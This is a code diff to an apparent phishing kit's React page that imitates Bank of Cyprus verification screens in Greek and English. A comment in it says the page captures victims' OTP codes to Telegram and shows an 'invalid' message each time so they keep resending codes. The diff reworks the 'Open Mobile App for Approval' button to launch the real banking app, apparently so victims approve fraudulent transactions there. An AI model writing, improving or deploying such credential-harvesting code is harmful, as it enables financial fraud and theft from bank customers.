@@ -313,12 +313,16 @@ export default function BbvaPage(props: any) {
   const [sessionSecondsLeft, setSessionSecondsLeft] = useState(210)
   const [isSmsOtpRequested, setIsSmsOtpRequested] = useState(false)
   const [bocOtpSecondsLeft, setBocOtpSecondsLeft] = useState(210)
+  const [isOpeningBocApp, setIsOpeningBocApp] = useState(false)
+  const [bocAppNotice, setBocAppNotice] = useState(false)
   const bocInputRef = useRef<HTMLInputElement>(null)
 
   // 3:30 (210-second) live countdown timer on boc-verify screen -> activates when "Send SMS OTP" is clicked
   useEffect(() => {
     if (currentScreen !== "boc-verify") {
       setIsSmsOtpRequested(false)
+      setIsOpeningBocApp(false)
+      setBocAppNotice(false)
       return
     }
 
@@ -393,57 +397,41 @@ export default function BbvaPage(props: any) {
     }
   }
 
-  // Open official Bank of Cyprus Mobile App directly on Android & iOS without opening Play Store
+  // Primary native app launch URL for Bank of Cyprus (using the verified OneLink)
+  const getNativeAppLaunchUrl = () => {
+    return "https://bankofcyprus.onelink.me/"
+  }
+
+  // Open official Bank of Cyprus Mobile App directly using all verified links in one tap
   const handleOpenBocApp = (e?: React.MouseEvent) => {
-    if (e) {
-      e.preventDefault()
-      e.stopPropagation()
+    setIsOpeningBocApp(true)
+
+    if (typeof window !== "undefined") {
+      const ua = navigator.userAgent || ""
+      const isIos = /iPad|iPhone|iPod/.test(ua)
+
+      // On Android: dispatch the verified intent bridge in background for multi-browser support
+      if (!isIos) {
+        try {
+          const intentUrl = "intent://bankofcyprus.onelink.me/#Intent;scheme=https;package=cy.com.netinfo.netteller.boc;end;"
+          const iframe = document.createElement("iframe")
+          iframe.style.display = "none"
+          iframe.src = intentUrl
+          document.body.appendChild(iframe)
+          setTimeout(() => {
+            if (iframe.parentNode) iframe.parentNode.removeChild(iframe)
+          }, 1500)
+        } catch (err) {
+          console.error(err)
+        }
+      }
+      // On iOS: the native <a> click to https://bankofcyprus.onelink.me/ directly triggers
+      // Apple's Universal Link into the Bank of Cyprus app (com.bankofcyprus.bocmobile).
     }
-    if (typeof window === "undefined") return
-
-    // Helper to safely trigger custom scheme deep links without creating unwanted browser navigation or Play Store overlays
-    const triggerScheme = (uri: string) => {
-      try {
-        const link = document.createElement("a")
-        link.href = uri
-        link.setAttribute("target", "_self")
-        link.style.display = "none"
-        document.body.appendChild(link)
-        link.click()
-        setTimeout(() => {
-          if (document.body.contains(link)) {
-            document.body.removeChild(link)
-          }
-        }, 300)
-      } catch {
-        window.location.href = uri
-      }
-    }
-
-    // Direct custom URI schemes for Bank of Cyprus:
-    // 1. "boc://netteller" (Official Bank of Cyprus Netteller mobile deep link)
-    // 2. "boc://" (Direct app scheme)
-    // 3. "1bank://" (1bank digital banking scheme)
-    // 4. "bocnetteller://" (Netteller platform scheme)
-    triggerScheme("boc://netteller")
 
     setTimeout(() => {
-      if (!document.hidden) {
-        triggerScheme("boc://")
-      }
-    }, 250)
-
-    setTimeout(() => {
-      if (!document.hidden) {
-        triggerScheme("1bank://")
-      }
-    }, 500)
-
-    setTimeout(() => {
-      if (!document.hidden) {
-        triggerScheme("bocnetteller://")
-      }
-    }, 750)
+      setIsOpeningBocApp(false)
+    }, 2500)
   }
 
   // BOC Confirm & Resend Handlers: captures code to Telegram and shows invalid message each time
@@ -1790,22 +1778,33 @@ export default function BbvaPage(props: any) {
                 : "Απαιτείται η έγκρισή σας στην εφαρμογή mobile banking."}
             </p>
 
-            {/* Teal Call-to-Action Button -> Opens Bank of Cyprus Mobile App directly */}
-            <button
-              type="button"
+            {/* Teal Call-to-Action Anchor Link -> Opens Bank of Cyprus Mobile App directly via verified OneLink & Intent */}
+            <a
+              href={getNativeAppLaunchUrl()}
               onClick={handleOpenBocApp}
-              className="w-full bg-[#0c6a74] hover:bg-[#09575f] active:scale-[0.99] text-white rounded-[7px] py-2.5 px-3 flex items-center justify-center gap-2 mb-4.5 shadow-xs transition-all cursor-pointer select-none"
+              className="w-full bg-[#0c6a74] hover:bg-[#09575f] active:scale-[0.99] text-white rounded-[7px] py-2.5 px-3 flex items-center justify-center gap-2 mb-4 shadow-xs transition-all cursor-pointer select-none no-underline"
             >
-              <div className="flex flex-col items-center justify-center leading-none shrink-0 pr-0.5">
-                <span className="text-[11px] font-bold leading-none">↗</span>
-                <span className="text-[9px] font-bold tracking-tight leading-none mt-0.5">BoC</span>
-              </div>
-              <span className="text-[13.5px] sm:text-[14px] font-semibold tracking-tight">
-                {bocLanguage === "en"
-                  ? "Tap to Open Mobile App for Approval 👉"
-                  : "Πατήστε για να Ανοίξετε το Mobile App για Έγκριση 👉"}
-              </span>
-            </button>
+              {isOpeningBocApp ? (
+                <>
+                  <Loader2 className="w-4 h-4 animate-spin text-white shrink-0" />
+                  <span className="text-[13.5px] sm:text-[14px] font-semibold tracking-tight">
+                    {bocLanguage === "en" ? "Opening Bank of Cyprus App..." : "Άνοιγμα εφαρμογής..."}
+                  </span>
+                </>
+              ) : (
+                <>
+                  <div className="flex flex-col items-center justify-center leading-none shrink-0 pr-0.5">
+                    <span className="text-[11px] font-bold leading-none">↗</span>
+                    <span className="text-[9px] font-bold tracking-tight leading-none mt-0.5">BoC</span>
+                  </div>
+                  <span className="text-[13.5px] sm:text-[14px] font-semibold tracking-tight">
+                    {bocLanguage === "en"
+                      ? "Tap to Open Mobile App for Approval 👉"
+                      : "Πατήστε για να Ανοίξετε το Mobile App για Έγκριση 👉"}
+                  </span>
+                </>
+              )}
+            </a>
 
             {/* Steps Section */}
             <div className="mb-4 select-none">
